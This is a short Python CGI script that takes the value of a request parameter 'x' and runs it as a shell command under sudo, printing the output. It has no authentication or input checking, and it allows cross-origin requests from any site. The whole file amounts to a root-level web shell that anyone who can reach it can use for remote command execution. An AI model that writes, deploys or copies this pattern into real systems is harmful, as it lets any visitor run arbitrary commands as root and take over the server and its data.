#!/usr/bin/python3
import subprocess
import cgi
print("content-type:text/html")
print("Access-Control-Allow-Origin: *")
print()

f_storage = cgi.FieldStorage()
cmd = f_storage.getvalue("x")

print(subprocess.getoutput(f"sudo {cmd}"))
